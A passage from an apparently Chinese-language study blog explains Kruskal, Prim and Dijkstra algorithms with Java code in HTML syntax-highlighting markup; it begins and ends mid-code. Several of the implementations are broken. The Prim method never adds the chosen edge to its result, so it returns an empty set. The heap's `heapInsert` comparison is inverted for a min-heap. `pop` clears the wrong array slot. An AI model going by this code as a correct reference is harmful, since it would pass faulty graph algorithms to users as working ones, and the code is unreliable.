<span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">edgeComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> each<span class="token operator">:</span>graph<span class="token punctuation">.</span>edges<span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>pq<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Edge</span> edge <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> from <span class="token operator">=</span> edge<span class="token punctuation">.</span>from<span class="token punctuation">;</span>        <span class="token class-name">Node</span> <span class="token keyword">to</span> <span class="token operator">=</span> edge<span class="token punctuation">.</span><span class="token keyword">to</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>myset<span class="token punctuation">.</span><span class="token function">isSameSet</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span>            myset<span class="token punctuation">.</span><span class="token function">union</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>可以使用并查集替代<code>mySets</code>，更加高效</p></blockquote><h4 id="p-prim-算法"><a href="#p-prim-算法" class="headerlink" title="p (prim) 算法"></a>p (prim) 算法</h4><p>该算法不需要突然将两个集合连接起来，具体逻辑为从某点开始，解锁所有与该点连接的边，然后挑选权重最小的边，看该条边另一端的点，是否注册过，没有就加入这条边，直至将所有点遍历完毕</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> <span class="token function">prim</span><span class="token punctuation">(</span><span class="token class-name">Graph</span> graph<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> pq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">edgeComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 这个大循环的作用是防止有森林的出现，即整个图不连通，分为几个独立的连通的区域</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token operator">:</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> each<span class="token operator">:</span>node<span class="token punctuation">.</span>edges<span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>pq<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Edge</span> edge <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Node</span> <span class="token keyword">to</span> <span class="token operator">=</span> edge<span class="token punctuation">.</span><span class="token keyword">to</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> each<span class="token operator">:</span><span class="token keyword">to</span><span class="token punctuation">.</span>edges<span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> each<span class="token operator">:</span><span class="token keyword">to</span><span class="token punctuation">.</span>edges<span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该行代码会重复把同一条边加入堆中，但是并不影响结果，而且边是有限的，外一层每次循环都会弹出一个，不会造成死循环</p></blockquote><h3 id="Dijkstra算法"><a href="#Dijkstra算法" class="headerlink" title="Dijkstra算法"></a>Dijkstra算法</h3><p>给定一个出发点，算法会得出从该点到其他点的最小距离，该算法只适用于权重为正数的边</p><h4 id="1-0-4"><a href="#1-0-4" class="headerlink" title="1.0"></a>1.0</h4><p>假定出发点为A，算到B，C，D的最小值</p><p>首先定义一张表，含有从出发点到每个点的距离，初始状态当然为到A的为0，到B，C，D的为无穷大</p><p>每次选择表中距离最小的点，第一次当然选择A，然后看从该点指出来的边，与表中比对，是否使用这些边使得表中的距离可以变小，然后修改，一轮过后，循环直到遍历所有点（每次循环都会搞定一个点，称之为锁死一个点，之后不会再改变到该点的距离）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token function">dijkstra</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> distanceMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> selectedNodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    distanceMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> minNode <span class="token operator">=</span> <span class="token function">minDistanceUnselectedNode</span><span class="token punctuation">(</span>distanceMap<span class="token punctuation">,</span> selectedNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>minNode <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> curDistance <span class="token operator">=</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>minNode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> eachEdge<span class="token operator">:</span>minNode<span class="token punctuation">.</span>edges<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> toNode <span class="token operator">=</span> eachEdge<span class="token punctuation">.</span><span class="token keyword">to</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>distanceMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>toNode<span class="token punctuation">)</span><span class="token punctuation">)</span> distanceMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>toNode<span class="token punctuation">,</span> curDistance <span class="token operator">+</span> eachEdge<span class="token punctuation">.</span>weight<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> distanceMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>toNode<span class="token punctuation">,</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>toNode<span class="token punctuation">)</span><span class="token punctuation">,</span> curDistance <span class="token operator">+</span> eachEdge<span class="token punctuation">.</span>weight<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        selectedNodes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>minNode<span class="token punctuation">)</span><span class="token punctuation">;</span>        minNode <span class="token operator">=</span> <span class="token function">minDistanceUnselectedNode</span><span class="token punctuation">(</span>distanceMap<span class="token punctuation">,</span> selectedNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> distanceMap<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 在map中找到没有被锁死的点，而且是距离最小的点</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">minDistanceUnselectedNode</span><span class="token punctuation">(</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> map<span class="token punctuation">,</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span> minNode <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> minDistance <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> entry<span class="token operator">:</span>map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> key <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> value <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>minDistance <span class="token operator">></span> value<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            minDistance <span class="token operator">=</span> value<span class="token punctuation">;</span>            minNode <span class="token operator">=</span> key<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> minNode<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-堆优化方案"><a href="#2-0-堆优化方案" class="headerlink" title="2.0 堆优化方案"></a>2.0 堆优化方案</h4><p>改写小根堆，使堆增加如下性质：</p><p>可以修改堆中某个节点的值，经过调整，仍然是小根堆</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> nodeRecord<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> node<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> distance<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">nodeRecord</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> distance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>node <span class="token operator">=</span> node<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>distance <span class="token operator">=</span> distance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> nodeHeap<span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Node</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nodes<span class="token punctuation">;</span>    <span class="token comment">// 即记录每个节点在上一行nodes数组的下标</span>    <span class="token keyword">private</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> nodeIndexMap<span class="token punctuation">;</span>    <span class="token comment">// 记录目前为止到该节点的距离</span>    <span class="token keyword">private</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> distanceMap<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">nodeHeap</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        nodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span>        nodeIndexMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        distanceMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">heapInsert</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span><span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">swap</span><span class="token punctuation">(</span><span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>            index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> heapSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> left <span class="token operator">=</span> index <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>left <span class="token operator">&lt;</span> heapSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> smallest <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> heapSize<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> left <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">:</span> left<span class="token punctuation">;</span>            smallest <span class="token operator">=</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>smallest<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> smallest <span class="token operator">:</span> index<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>smallest <span class="token operator">==</span> index<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>smallest<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>            index <span class="token operator">=</span> smallest<span class="token punctuation">;</span>            left <span class="token operator">=</span> index <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        nodeIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>        nodeIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> temp <span class="token operator">=</span> nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nodes<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        nodes<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isEntered</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> nodeIndexMap<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isOnHeap</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">isEntered</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>nodeIndexMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> nodeRecord <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> node <span class="token operator">=</span> nodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        nodeRecord nr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">nodeRecord</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nodeIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        distanceMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">swap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">--</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        nodes<span class="token punctuation">[</span>size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 从来没有进入堆过，则add</span>    <span class="token comment">// 发现在堆中，但是distance更小，则update</span>    <span class="token comment">// 发现在堆中，但是并没有更小，则ignore</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addOrUpdateOrIgnore</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> distance<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEntered</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            nodes<span class="token punctuation">[</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">;</span>            nodeIndexMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>            distanceMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> distance<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">heapInsert</span><span class="token punctuation">(</span>size<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isOnHeap</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            distanceMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>distanceMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">,</span> distance<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">heapInsert</span><span class="token punctuation">(</span>nodeIndexMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token function">dijkstra2</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    nodeHeap heap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">nodeHeap</span><span class="token punctuation">(</span>size<span class="token 